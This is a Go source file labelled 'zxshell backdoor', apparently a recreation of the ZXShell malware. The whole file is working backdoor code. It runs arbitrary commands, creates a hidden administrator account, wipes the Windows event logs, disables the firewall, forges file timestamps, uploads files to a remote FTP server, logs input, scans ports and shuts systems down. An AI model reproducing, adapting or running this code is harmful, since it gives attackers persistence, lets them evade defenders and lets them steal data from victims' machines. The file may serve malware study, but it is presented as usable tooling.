// zxshell backdoor
// v1.1.0
// https://github.com/0x4F776C/Malware/tree/main/ZXShell

//go:build windows
// +build windows

package main

import (
	"bufio"
	"flag"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"syscall"
	"time"

	"github.com/secsy/goftp"
)

// Function to execute shell commands
func executeCommand(command string) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Fprintln(os.Stderr, "Error executing command:", err)
	}

	fmt.Println(string(output))
}

// Function to display help
func showHelp() {
	helpText := `
Available Commands:
CA = Clone an account with "System" privilege
CleanEvent = Clean event logs
CloseFW = Close Windows Firewall
Execute = Execute command
FileTime = Clone timestamp of a file
Help | ? = Show help file
KeyLog = Capture keyboard command
PortScan = Do a port scan
RunAs = Just like the Windows "Runas" command
Shutdown = Restart/Shutdown the system
Sysinfo = Display system information
Exfiltrate = Exfiltrate a file to a remote server
    `
	fmt.Println(helpText)
}

// Function to display system information
func sysinfo() {
	executeCommand("systeminfo")
}

// Function to shutdown the system
func shutdown() {
	if runtime.GOOS == "windows" {
		executeCommand("shutdown /s /t 0")
	} else {
		executeCommand("shutdown now")
	}
}

// Function to exfiltrate a file to a remote server via FTP
func exfiltrate(ftpServer, ftpUser, ftpPass, filePath string) {
	config := goftp.Config{
		User:     ftpUser,
		Password: ftpPass,
	}

	client, err := goftp.DialConfig(config, ftpServer)
	if err != nil {
		fmt.Println("Error connecting to FTP server:", err)
		return
	}

	file, err := os.Open(filePath)
	if err != nil {
		fmt.Println("Error opening file:", err)
		return
	}
	defer file.Close()

	err = client.Store(filePath, file)
	if err != nil {
		fmt.Println("Error uploading file:", err)
		return
	}

	fmt.Println("File uploaded successfully")
}

// Function to clone an account with "System" privilege
func cloneAccount() {
	fmt.Println("Cloning account with 'System' privilege")
	executeCommand("net user cloneuser /add")
	executeCommand("net localgroup administrators cloneuser /add")
}

// Function to clean event logs
func cleanEvent() {
	fmt.Println("Cleaning event logs")
	executeCommand("wevtutil cl Application")
	executeCommand("wevtutil cl Security")
	executeCommand("wevtutil cl System")
}

// Function to close Windows Firewall
func closeFirewall() {
	fmt.Println("Closing Windows Firewall")
	executeCommand("netsh advfirewall set allprofiles state off")
}

// Function to clone file timestamp
func cloneFileTime(sourceFile, targetFile string) {
	fmt.Println("Cloning file timestamp from", sourceFile, "to", targetFile)

	sourceInfo, err := os.Stat(sourceFile)
	if err != nil {
		fmt.Println("Error reading source file:", err)
		return
	}

	modTime := sourceInfo.ModTime()
	err = os.Chtimes(targetFile, time.Now(), modTime)
	if err != nil {
		fmt.Println("Error setting file timestamp:", err)
		return
	}

	fmt.Println("Timestamp cloned successfully")
}

// Function to capture keyboard commands (basic key logger)
func keyLog() {
	fmt.Println("Starting key logger")

	input := make(chan string)
	go func() {
		reader := bufio.NewReader(os.Stdin)
		for {
			text, _ := reader.ReadString('\n')
			input <- text
		}
	}()

	for {
		select {
		case line := <-input:
			fmt.Println("Captured:", line)
		}
	}
}

// Function to perform port scan
func portScan(scanTarget string) {
	fmt.Println("Performing port scan on", scanTarget)

	for port := 1; port <= 1024; port++ {
		address := fmt.Sprintf("%s:%d", scanTarget, port)
		conn, err := net.Dial("tcp", address)
		if err == nil {
			fmt.Println("Port", port, "is open")
			conn.Close()
		}
	}
}

// Function to run as another user
func runAs(user, command string) {
	fmt.Println("Running command as user", user)

	cmd := exec.Command("runas", fmt.Sprintf("/user:%s", user), command)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Fprintln(os.Stderr, "Error executing runas command:", err)
	}

	fmt.Println(string(output))
}

func main() {
	// Define flags
	helpFlag := flag.Bool("help", false, "Show help")
	executeFlag := flag.String("execute", "", "Execute command")
	sysinfoFlag := flag.Bool("sysinfo", false, "Display system information")
	shutdownFlag := flag.Bool("shutdown", false, "Shutdown the system")
	exfiltrateFlag := flag.Bool("exfiltrate", false, "Exfiltrate a file to a remote server")
	ftpServer := flag.String("ftpserver", "", "FTP server for exfiltration")
	ftpUser := flag.String("ftpuser", "", "FTP username")
	ftpPass := flag.String("ftppass", "", "FTP password")
	filePath := flag.String("file", "", "File path for exfiltration")
	caFlag := flag.Bool("ca", false, "Clone an account with 'System' privilege")
	cleanEventFlag := flag.Bool("cleanevent", false, "Clean event logs")
	closeFWFlag := flag.Bool("closefw", false, "Close Windows Firewall")
	fileTimeFlag := flag.Bool("filetime", false, "Clone timestamp of a file")
	sourceFile := flag.String("source", "", "Source file path for cloning timestamp")
	targetFile := flag.String("targetfile", "", "Target file path for cloning timestamp")
	keyLogFlag := flag.Bool("keylog", false, "Capture keyboard command")
	portScanFlag := flag.Bool("portscan", false, "Perform a port scan")
	portScanTarget := flag.String("scantarget", "", "Target for port scan")
	runAsFlag := flag.Bool("runas", false, "Run command as another user")
	runAsUser := flag.String("user", "", "User for runas command")
	runAsCommand := flag.String("command", "", "Command for runas")

	// Parse flags
	flag.Parse()

	// Handle flags
	if *helpFlag {
		showHelp()
	} else if *executeFlag != "" {
		executeCommand(*executeFlag)
	} else if *sysinfoFlag {
		sysinfo()
	} else if *shutdownFlag {
		shutdown()
	} else if *exfiltrateFlag {
		if *ftpServer == "" || *ftpUser == "" || *ftpPass == "" || *filePath == "" {
			fmt.Println("Error: FTP server, username, password, and file path are required for exfiltration")
		} else {
			exfiltrate(*ftpServer, *ftpUser, *ftpPass, *filePath)
		}
	} else if *caFlag {
		cloneAccount()
	} else if *cleanEventFlag {
		cleanEvent()
	} else if *closeFWFlag {
		closeFirewall()
	} else if *fileTimeFlag {
		if *sourceFile == "" || *targetFile == "" {
			fmt.Println("Error: Source and target file paths are required for cloning timestamp")
		} else {
			cloneFileTime(*sourceFile, *targetFile)
		}
	} else if *keyLogFlag {
		keyLog()
	} else if *portScanFlag {
		if *portScanTarget == "" {
			fmt.Println("Error: Target is required for port scan")
		} else {
			portScan(*portScanTarget)
		}
	} else if *runAsFlag {
		if *runAsUser == "" || *runAsCommand == "" {
			fmt.Println("Error: User and command are required for runas")
		} else {
			runAs(*runAsUser, *runAsCommand)
		}
	} else {
		fmt.Println("Unknown command. Use -help for a list of commands.")
	}
}
